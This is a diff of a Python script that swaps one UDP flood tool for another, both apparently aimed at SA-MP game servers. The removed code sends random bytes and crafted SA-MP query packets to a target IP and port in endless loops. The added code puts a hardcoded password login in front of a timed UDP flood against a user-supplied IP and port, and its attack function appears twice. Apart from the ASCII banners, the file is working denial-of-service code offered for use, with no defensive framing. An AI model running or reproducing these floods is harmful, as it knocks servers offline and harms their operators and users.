@@ -1,262 +1,186 @@
-#Since : 25-07-2022
-#-------[ ALL IMPORT ]-------#
-import socket
-import struct
+import os
 import codecs
 import sys
-import threading
 import random
+import threading
 import time
-import os
-#-------[ ALL SETTINGS ]-------#
-ip = sys.argv[1]
-port = sys.argv[2]
-
-#ip = str(input("IP TARGET:"))
-#port = int(input("PORT TARGET:"))
-
-fake_ip = '66.118.234.34:22'
-
-proxysy = open('Lex.txt').readlines()
-bots = len(proxysy)
-user = ('ADMIN')
-#---------------------[ Randomlex CODE ]---------------------#
-Randomlex = [
- b'SAMP\x90\xd9\x1dMa\x1ep\nF[\x00',
- b'SAMP\x958\xe1\xa9a\x1ec',
- b'SAMP\x958\xe1\xa9a\x1ei',
- b'SAMP\x958\xe1\xa9a\x1er',
- b'SAMP\x958\xe1\xa9a\x1ev',
- b'SAMP\x958\xe1\xa9a\x1eg',
- b'\x08\x1eb\xda',
- b'\x08\x1eb\xda',
- b'\x02\x1e\xfdS',
- b'\x08\x1eM\xda',
- b'\x02\x1e\xfd@',
- b'\x08\x1e~\xda'
- ]
-prot = (random.randint(200,350))
-sys.stdout.write("\x1b]2;[-] ULTRAS | Online User : [{}] | Running Attack [1] | Bot Connected [{}] | Username : {}\x07".format (prot,bots,user))
+import socket
+from time import time as tt
 
 os.system("clear")
-#---------------------[ BANNER'S ]---------------------
-banner =  """
-\033[36m                        ╔════════════════════════════════════╗
-\033[36m                        ║       \033[33m╦ ╦ ╦  ═╦═ ╦═╗ ╔═╗ ╔═╗       \033[36m║
-\033[36m                        ║       \033[33m║ ║ ║   ║  ╠╦╝ ╠╩╣ ╚═╗       \033[36m║
-\033[36m                        ║       \033[33m╚═╝ ╩═╝ ╩  ╩╚═ ╩ ╩ ╚═╝       \033[36m║
-\033[36m                        ╚════════════════════════════════════╝
-\033[35m                   ╔═══════════════════════════════════════════╗                 
-\033[35m                   ║ \033[32m- -ATTACKING SERVER  (\033[33mAWAS DOWN BWANG\033[32m)- - \033[35m║
-\033[35m                   ╚═══════════════════════════════════════════╝
-"""
-banners = """
-\033[36m                      ╔════════════════════════════════════╗
-\033[36m                      ║\033[33m         ╦  ╔═╗═╗ ╦╔═╗╦ ╦╦ ╦\033[36m        ║
-\033[36m                      ║\033[33m         ║  ║╣ ╔╩╦╝║ ║╚╦╝╚╦╝\033[36m        ║
-\033[36m                      ║\033[33m         ╩═╝╚═╝╩ ╚═╚═╝ ╩  ╩ \033[36m        ║
-\033[36m                      ╚════════════════════════════════════╝
-\033[35m                    ╔═════════════════════════════════════════════╗                 
-\033[35m                    ║  \033[32m- -DEVELOPER TOOLS ULTRAS  (\033[33mLEX SA-MP\033[33m)- -\033[35m  ║
-\033[35m                    ╚═════════════════════════════════════════════╝
-"""
-welcome =  """
-───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───   Welcome! to ULTRASS
-───█▒▒░░░░░░░░░▒▒█───   Use "help" For Help Command
-────█░░█░░░░░█░░█────   Developer Tools : Lexyy / LEX SA-MP
-─▄▄──█░░░▀█▀░░░█──▄▄─   
-█░░█─▀▄░░░░░░░▄▀─█░░█
-█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
-█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
-█░░║║║╠─║─║─║║║║║╠─░░█
-█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
-█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
-"""
 
-print(welcome)
-time.sleep(3)
+print("""\033[91m
+
+██╗░░██╗░█████╗░██╗░░░██╗██████╗░
+╚██╗██╔╝██╔══██╗██║░░░██║╚════██╗
+░╚███╔╝░███████║╚██╗░██╔╝░░███╔═╝
+░██╔██╗░██╔══██║░╚████╔╝░██╔══╝░░
+██╔╝╚██╗██║░░██║░░╚██╔╝░░███████╗
+╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝
+""")
+
+username = str(input("\033[94m[XAV2] \033[93mUsername:"))
+password = str(input("\033[94m[XAV2] \033[93mPassword:"))
+if password == "Aurasayang" and username == "Aurasayang":
+    print ("Telah Masuk Sebagai Aura")
+    time.sleep(2)
+
+else:
+    print ("Passwordnya Salah Bruh.")
+    time.sleep(999)
+
 os.system("clear")
-print(banner)
-time.sleep(0.9)
-print ("\033[36m[BOT] \033[32m• \033[33mYOU ATTACK HAS LAUNCHED TO IP \033[31m%s \033[32mAND PORT \033[31m%s"%(ip,port))
+print("\033[92mConnecting To Server [\033[97m•\033[92m]")
+time.sleep(0.5)
 
-def spoofer():
-    addr = [192, 168, 0, 1]
-    d = '4.240.112.191'
-    addr[0] = str(random.randrange(11, 197))
-    addr[1] = str(random.randrange(0, 255))
-    addr[2] = str(random.randrange(0, 255))
-    addr[3] = str(random.randrange(2, 254))
-    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
-    return assemebled
 
-#--------------[ START DDOS BY LEXYY ]--------------#
-def xxxxxxx():
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1081) #1081
-        pack = random._urandom(999) #666
-        payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'#ATTACK HEX
-        msg = Randomlex[random.randrange(0, 9)]
-        sock.sendto(bytes, (ip, int(port)))
-        sock.sendto(pack, (ip, int(port)))
-        sock.sendto(payload, (ip, int(port)))
-        sock.sendto(msg, (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[1], (ip, int(port)))
-        sock.sendto(Randomlex[2], (ip, int(port)))
-        sock.sendto(Randomlex[3], (ip, int(port)))
-        sock.sendto(Randomlex[4], (ip, int(port)))
-        sock.sendto(Randomlex[5], (ip, int(port)))
-        sock.sendto(Randomlex[6], (ip, int(port)))
-        sock.sendto(Randomlex[7], (ip, int(port)))
-        sock.sendto(Randomlex[8], (ip, int(port)))
-        sock.sendto(Randomlex[9], (ip, int(port)))
-        sock.sendto(Randomlex[10], (ip, int(port)))
-        sock.sendto(Randomlex[11], (ip, int(port)))
+nicknm = "AxeLL"
 
-def xxxxxx():
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-        bytes = random._urandom(1460)
-        payload = b'\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
-        sock.sendto(bytes, (ip, int(port)))
-        sock.sendto(payload, (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[1], (ip, int(port)))
-        sock.sendto(Randomlex[2], (ip, int(port)))
-        sock.sendto(Randomlex[3], (ip, int(port)))
-        sock.sendto(Randomlex[4], (ip, int(port)))
-        sock.sendto(Randomlex[5], (ip, int(port)))
-        sock.sendto(Randomlex[6], (ip, int(port)))
-        sock.sendto(Randomlex[7], (ip, int(port)))
-        sock.sendto(Randomlex[8], (ip, int(port)))
-        sock.sendto(Randomlex[9], (ip, int(port)))
-        sock.sendto(Randomlex[10], (ip, int(port)))
-        sock.sendto(Randomlex[11], (ip, int(port)))
+mt = """\033[96mUnder \033[0;93mmaintance"""
 
-def xxxxx():
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1081) #1081
-        pack = random._urandom(999) #666
-        msg = Randomlex[random.randrange(0, 9)]
-        sock.sendto(bytes, (ip, int(port)))
-        sock.sendto(pack, (ip, int(port)))
-        sock.sendto(msg, (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[1], (ip, int(port)))
-        sock.sendto(Randomlex[2], (ip, int(port)))
-        sock.sendto(Randomlex[3], (ip, int(port)))
-        sock.sendto(Randomlex[4], (ip, int(port)))
-        sock.sendto(Randomlex[5], (ip, int(port)))
-        sock.sendto(Randomlex[6], (ip, int(port)))
-        sock.sendto(Randomlex[7], (ip, int(port)))
-        sock.sendto(Randomlex[8], (ip, int(port)))
-        sock.sendto(Randomlex[9], (ip, int(port)))
-        sock.sendto(Randomlex[10], (ip, int(port)))
-        sock.sendto(Randomlex[11], (ip, int(port)))
+os.system("clear")
 
-def xxxx():
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-        bytes = random._urandom(1460)
-        sock.sendto(bytes, (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[1], (ip, int(port)))
-        sock.sendto(Randomlex[2], (ip, int(port)))
-        sock.sendto(Randomlex[3], (ip, int(port)))
-        sock.sendto(Randomlex[4], (ip, int(port)))
-        sock.sendto(Randomlex[5], (ip, int(port)))
-        sock.sendto(Randomlex[6], (ip, int(port)))
-        sock.sendto(Randomlex[7], (ip, int(port)))
-        sock.sendto(Randomlex[8], (ip, int(port)))
-        sock.sendto(Randomlex[9], (ip, int(port)))
-        sock.sendto(Randomlex[10], (ip, int(port)))
-        sock.sendto(Randomlex[11], (ip, int(port)))
+print("""\033[94m
+ ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+_¶¶___________________________________¶¶
+_¶¶___________________________________¶¶
+__¶¶_________________________________¶¶_
+__¶¶_________________________________¶¶_
+___¶¶_______________________________¶¶__
+___¶¶______________________________¶¶___
+____¶¶¶__________________________¶¶¶____
+_____¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶_____
+_______¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶_______
+_________¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶_________
+___________¶¶¶¶¶_¶¶¶¶¶¶¶_¶¶¶¶___________
+______________¶¶¶¶_¶¶¶_¶¶¶______________
+________________¶¶¶_¶_¶¶________________
+_________________¶¶¶_¶¶_________________
+__________________¶¶_¶¶_________________
+__________________¶¶_¶__________________
+__________________¶¶_¶¶_________________
+________________¶¶¶_¶_¶¶¶_______________
+_____________¶¶¶¶¶__¶__¶¶¶¶¶____________
+__________¶¶¶¶¶_____¶_____¶¶¶¶__________
+________¶¶¶¶________¶_______¶¶¶¶¶_______
+_______¶¶¶__________¶__________¶¶¶¶_____
+_____¶¶¶____________¶____________¶¶¶____
+____¶¶¶_____________¶______________¶¶___
+___¶¶¶______________¶_______________¶¶__
+___¶¶_______________¶________________¶¶_
+__¶¶________________¶________________¶¶_
+__¶¶_______________¶¶¶________________¶_
+__¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶
+__¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶
+__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
+""")
 
-def xxx():
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1081) #1081
-        pack = random._urandom(666) #666
-        msg = Randomlex[random.randrange(0, 9)]
-        sock.sendto(bytes, (ip, int(port)))
-        sock.sendto(pack, (ip, int(port)))
-        sock.sendto(msg, (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[1], (ip, int(port)))
-        sock.sendto(Randomlex[2], (ip, int(port)))
-        sock.sendto(Randomlex[3], (ip, int(port)))
-        sock.sendto(Randomlex[4], (ip, int(port)))
-        sock.sendto(Randomlex[5], (ip, int(port)))
-        sock.sendto(Randomlex[6], (ip, int(port)))
-        sock.sendto(Randomlex[7], (ip, int(port)))
-        sock.sendto(Randomlex[8], (ip, int(port)))
-        sock.sendto(Randomlex[9], (ip, int(port)))
-        sock.sendto(Randomlex[10], (ip, int(port)))
-        sock.sendto(Randomlex[11], (ip, int(port)))
-                
-def xx():
-    while True:
-        sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
-        bytes = random._urandom(1460)
-        sock.sendto(bytes, (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[1], (ip, int(port)))
-        sock.sendto(Randomlex[2], (ip, int(port)))
-        sock.sendto(Randomlex[3], (ip, int(port)))
-        sock.sendto(Randomlex[4], (ip, int(port)))
-        sock.sendto(Randomlex[5], (ip, int(port)))
-        sock.sendto(Randomlex[6], (ip, int(port)))
-        sock.sendto(Randomlex[7], (ip, int(port)))
-        sock.sendto(Randomlex[8], (ip, int(port)))
-        sock.sendto(Randomlex[9], (ip, int(port)))
-        sock.sendto(Randomlex[10], (ip, int(port)))
-        sock.sendto(Randomlex[11], (ip, int(port)))
 
-def x():
+ip = str(input("\033[91m====> ★ IP   : "))
+port = int(input("====> $ PORT   : "))
+time = int(input("====> $ PACKET   : "))
+threads = int(input("====> $ THREADS   : "))
+
+os.system("clear")
+
+brand = """\033[94m
+███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█
+████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█
+███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
+████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
+███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█
+████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█
+███▓▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
+████▓▓▓▓▓▓▓▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
+███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
+█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█
+█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
+█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
+████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██
+████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██
+█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██
+█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███
+██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███
+███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████
+███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████
+████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████
+█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████
+██████████▓▓▓█▓▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬▓███████
+███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████
+██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████
+███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████
+
+\033[91m     PUNYA AXEL🌹AURA
+"""
+
+os.system("clear")
+
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(65535, port))
+    print(brand)
+    print("\033[92m ★★★★ DARI AXEL EUYY ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(666, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
     while True:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        bytes = random._urandom(1081) #1081
-        pack = random._urandom(999) #666
-        msg = Randomlex[random.randrange(0, 9)]
-        sock.sendto(bytes, (ip, int(port)))
-        sock.sendto(pack, (ip, int(port)))
-        sock.sendto(msg, (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[0], (ip, int(port)))
-        sock.sendto(Randomlex[1], (ip, int(port)))
-        sock.sendto(Randomlex[2], (ip, int(port)))
-        sock.sendto(Randomlex[3], (ip, int(port)))
-        sock.sendto(Randomlex[4], (ip, int(port)))
-        sock.sendto(Randomlex[5], (ip, int(port)))
-        sock.sendto(Randomlex[6], (ip, int(port)))
-        sock.sendto(Randomlex[7], (ip, int(port)))
-        sock.sendto(Randomlex[8], (ip, int(port)))
-        sock.sendto(Randomlex[9], (ip, int(port)))
-        sock.sendto(Randomlex[10], (ip, int(port)))
-        sock.sendto(Randomlex[11], (ip, int(port)))
-        
-              
-              
-#---------------------[ AUTO RUN ]---------------------#
+        port = port or random.randint(1, 65535)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(65535, port))
+    print(brand)
+    print("\033[92m ★★★★ DARI AXEL EUYY ★★★★")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(666, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or random.randint(1, 65535)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+
 if __name__ == '__main__':
     try:
-      xxxxxxx()
-      xxxxxx()
-      xxxxx()
-      xxxx()
-      xxx()
-      xx()
-      x()
-
-#---------------------[ CLOSING ]---------------------#
+        attack(ip, port, time, threads)
+        attack(ip, port, time, threads)
     except KeyboardInterrupt:
-        os.system('cls' if os.name == 'nt' else 'clear')
-        print("\033[0;37;40mclosed")
+        print('Attack stopped.')
